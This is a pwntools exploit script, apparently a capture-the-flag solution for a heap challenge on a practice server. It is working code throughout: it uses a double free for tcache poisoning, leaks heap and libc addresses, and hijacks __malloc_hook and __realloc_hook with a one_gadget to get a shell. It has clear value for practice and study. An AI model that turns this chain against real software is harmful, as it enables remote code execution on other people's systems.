# template-v2.0 for exploit scripts by fa1c4
# usage: python exp.py [REMOTE|GDB|NULL]
'''
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    glibc: Ubuntu GLIBC 2.27-3ubuntu1
    vuln: double free in sub_D2C without setting the ptr to NULL after free
exp: 
1.double free to leak tcache_addr and calculate tcache_struct_addr
2.free tcache_struct chunk to unsortedbin attack to leak libc_addr
3.tcache_struct attack to hijack realloc_hook to one_gadget and malloc_hook to realloc+8
4.malloc_hook -> realloc+8 -> realloc_hook -> one_gadget
'''
from pwn import *


# define the context
binary_name = './vn_pwn_easyTHeap'
libc_name = './ubuntu18-libc-2.27-x64.so' if args.REMOTE \
        else '/home/fa1c4/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6'
elf = ELF(binary_name, checksec=True) if binary_name else None
libc = ELF(libc_name, checksec=False) if libc_name else None
context.binary = elf
context(arch=elf.arch, os=elf.os)
context.terminal = ['tmux', 'splitw', '-h']

# define the io functions
rc  = lambda *x, **y: io.recv(*x, **y)
rl  = lambda *x, **y: io.recvline(*x, **y)
ru  = lambda *x, **y: io.recvuntil(*x, **y)
sn  = lambda *x, **y: io.send(*x, **y)
sl  = lambda *x, **y: io.sendline(*x, **y)
sa  = lambda *x, **y: io.sendafter(*x, **y)
sla = lambda *x, **y: io.sendlineafter(*x, **y)

# define the io object
if args.REMOTE:
    io = remote('node5.buuoj.cn', 25947)
elif args.GDB:
    io = gdb.debug(binary_name, gdbscript="""
        # break Add
        # brva 0x0000000000000AFF
        # break Del 
        # brva 0x0000000000000D2C
        # break Show
        # brva 0x0000000000000CA4
        # break Edit
        brva 0x0000000000000BEA
        c
    """, aslr=False)
else:
    io = process(binary_name)


# exploiting code
def Add(sz):
    sla(b'choice: ', b'1')
    sla(b'size?', str(sz).encode())

def Edit(idx, content):
    sla(b'choice: ', b'2')
    sla(b'idx?', str(idx).encode())
    sa(b'content:', content)

def Show(idx):
    sla(b'choice: ', b'3')
    sla(b'idx?', str(idx).encode())

def Del(idx):
    sla(b'choice: ', b'4')
    sla(b'idx?', str(idx).encode())


Add(0x50) # chunk0 | 0 & notice that smaller than 0x20 chunks will be put into tcache (?)
Del(0)
Del(0)
Show(0) # leak tcache_addr
tcache_addr = u64(ru(b'\n', drop=True).ljust(8, b'\x00'))
log.info(f'tcache_addr: {hex(tcache_addr)}')

prev_chunk_addr = tcache_addr - 0x250 # the tcache_struct_ptr is at prev_chunk + 0x10
Add(0x50) # chunk0 | 1
Edit(1, p64(prev_chunk_addr)) # chunk0 -> prev_chunk_addr
Add(0x50) # chunk0 | 2

Add(0x50) # prev_chunk + 0x10 | 3
Edit(3, b'F' * 0x50) # rewrite all content b'\x00'
Del(3)
Show(3) # unsortedbin attack to leak libc_addr
libc.address = u64(ru(b'\n', drop=True).ljust(8, b'\x00')) - 0x3ebca0
malloc_hook_addr = libc.sym['__malloc_hook']
realloc_addr = libc.sym['__libc_realloc']
log.info(f'libc_addr: {hex(libc.address)}')
log.info(f'malloc_hook_addr: {hex(malloc_hook_addr)}')
log.info(f'realloc_addr: {hex(realloc_addr)}')

# one_gadgets: 0x4f2be 0x4f2c5 0x4f322 0x10a38c
one_gadget_addr = libc.address + 0x10a38c 
log.info(f'one_gadget_addr: {hex(one_gadget_addr)}')

Add(0x100) # tcache_struct_ptr == prev_chunk + 0x10
Edit(4, b'F' * 0x60 + p64(malloc_hook_addr - 0x8))
Add(0x50) # tcache[0x50] = malloc_hook_addr - 0x8
Edit(5, p64(one_gadget_addr) + p64(realloc_addr + 8)) # skip push r15 to fulfill the condition of one_gadget
Add(0x10) # trigger one_gadget through malloc_hook -> realloc+8 -> realloc_hook -> one_gadget

# interact with the shell
io.interactive()
